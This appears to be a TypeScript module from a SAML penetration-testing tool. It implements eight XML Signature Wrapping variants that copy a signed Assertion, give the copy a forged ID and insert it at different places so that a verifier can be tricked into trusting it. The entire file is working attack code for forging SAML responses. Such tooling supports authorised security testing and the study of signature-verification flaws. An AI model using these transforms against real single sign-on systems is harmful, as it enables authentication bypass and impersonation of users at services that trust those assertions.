import { z } from "zod";

import { err, ok, type Result } from "../result.js";
import { extractBlocks } from "../xml.js";

export const XSW_VARIANTS = [1, 2, 3, 4, 5, 6, 7, 8] as const;

export type XswVariant = (typeof XSW_VARIANTS)[number];

export const XswVariantSchema = z.union([
  z.literal(1),
  z.literal(2),
  z.literal(3),
  z.literal(4),
  z.literal(5),
  z.literal(6),
  z.literal(7),
  z.literal(8),
]);

const replaceSignature = (
  xml: string,
  transform: (signature: string) => string,
): string => {
  const signatures = extractBlocks(xml, "Signature");
  const signature = signatures[0];
  if (signature === undefined) return xml;
  return xml.replace(signature, transform(signature));
};

/**
 * Structural XML Signature Wrapping transforms. Each variant duplicates the
 * signed <Assertion> block and re-inserts it at a different location, so a
 * parser that reads one position while the verifier validates another can be
 * tricked into trusting the forged copy.
 */
export const applyXsw = (xml: string, variant: XswVariant): Result<string> => {
  const assertions = extractBlocks(xml, "Assertion");
  const assertion = assertions[0];
  if (assertion === undefined) return err("No Assertion element found.");

  const forged = assertion.replace(/ID="[^"]*"/, 'ID="xsw-forged"');
  const position = xml.indexOf(assertion);
  if (position === -1) {
    return err("The Assertion element could not be located.");
  }

  const before = xml.slice(0, position);
  const after = xml.slice(position + assertion.length);

  switch (variant) {
    case 1:
      // Duplicate immediately before the original, inside the same parent.
      return ok(`${before}${forged}${assertion}${after}`);
    case 2:
      // Duplicate immediately after the original.
      return ok(`${before}${assertion}${forged}${after}`);
    case 3:
      // Duplicate wrapped in a <ds:Object> payload element.
      return ok(`${before}${assertion}${after}<Object>${forged}</Object>`);
    case 4:
      // Duplicate smuggled inside an <Extensions> wrapper.
      return ok(
        `${before}${assertion}${after}<Extensions>${forged}</Extensions>`,
      );
    case 5: {
      // Duplicate outside the Response envelope, before it.
      const responseStart = xml.search(/<(?:[\w-]+:)?Response(\s|>)/);
      if (responseStart === -1) return err("No Response element found.");
      return ok(
        `${xml.slice(0, responseStart)}${forged}${xml.slice(responseStart)}`,
      );
    }
    case 6: {
      // Duplicate outside the Response envelope, after it.
      const responseEnd = xml.search(/<\/(?:[\w-]+:)?Response>/);
      if (responseEnd === -1) return err("No Response element found.");
      const closing = /<\/(?:[\w-]+:)?Response>/.exec(xml);
      const end = closing!.index + closing![0].length;
      return ok(`${xml.slice(0, end)}${forged}${xml.slice(end)}`);
    }
    case 7:
      return ok(replaceSignature(xml, (sig) => `${forged}${sig}`));
    case 8:
      return ok(replaceSignature(xml, (sig) => `${sig}${forged}`));
  }
};

export const listXswVariants = (): readonly XswVariant[] => XSW_VARIANTS;
